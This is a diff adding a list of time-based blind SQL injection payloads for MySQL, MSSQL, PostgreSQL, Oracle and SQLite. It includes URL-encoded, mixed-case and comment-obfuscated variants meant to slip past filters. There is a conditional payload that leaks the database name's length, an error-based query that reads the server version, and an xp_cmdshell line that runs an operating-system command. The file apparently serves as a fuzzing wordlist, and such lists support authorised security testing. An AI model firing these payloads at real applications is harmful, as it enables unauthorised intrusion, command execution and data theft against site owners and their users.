@@ -1,0 +1,54 @@
+1' AND SLEEP(5)-- -
+1' AND SLEEP(5)#
+1' WAITFOR DELAY '0:0:5'-- -
+1'; WAITFOR DELAY '0:0:5'-- -
+1' AND pg_sleep(5)-- -
+1' AND 1=1 LIMIT 1;SELECT pg_sleep(5)-- -
+1'; SELECT SLEEP(5)-- -
+1 UNION SELECT SLEEP(5)-- -
+1 AND SLEEP(5)-- -
+1 AND 1=SLEEP(5)-- -
+1'; SELECT pg_sleep(5)-- -
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+1' AND (SELECT 1 FROM (SELECT SLEEP(5))A)-- -
+1' OR SLEEP(5)-- -
+1' OR 1=1 AND SLEEP(5)-- -
+1'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')-- -
+'; WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'
+1;SELECT SLEEP(5)
+1'/**/AND/**/SLEEP(5)-- -
+1' AND SLEEP(5) AND '1'='1
+1" AND SLEEP(5)-- -
+1") AND SLEEP(5)-- -
+1')) AND SLEEP(5)-- -
+1 AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL
+1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)-- -
+1 AND 1=(SELECT 1 FROM PG_SLEEP(5))
+1' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -
+1;SELECT+SLEEP(5)--
+1' OR SLEEP(5) AND '1'='1
+1'/**/OR/**/SLEEP(5)-- -
+# URL-encoded time-based variants
+1%27+AND+SLEEP(5)--%20-
+1%27+WAITFOR+DELAY+%270%3a0%3a5%27--%20-
+1%27+AND+pg_sleep(5)--%20-
+1%27%20AND%20SLEEP(5)--%20-
+%27%3b+WAITFOR+DELAY+%270%3a0%3a5%27--
+1%2527+AND+SLEEP(5)--%20
+# Mixed case timing
+1' AnD SlEeP(5)-- -
+1' WaItFoR dElAy '0:0:5'-- -
+# Comment-obfuscated
+1'/**/AND/**/SLEEP(5/*comment*/)-- -
+1'/*!AND*/SLEEP(5)-- -
+# Randomblob SQLite
+1' AND randomblob(500000000)-- -
+# BENCHMARK MySQL
+1' AND BENCHMARK(50000000,SHA1('a'))-- -
+1 AND BENCHMARK(50000000,MD5('a'))-- -
+# Conditional sleep
+1' AND IF(1=1,SLEEP(5),SLEEP(0))-- -
+1' AND IF(LENGTH(database())>5,SLEEP(5),SLEEP(0))-- -
+# Heavy query timing (no SLEEP function)
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a AND SLEEP(5))-- -
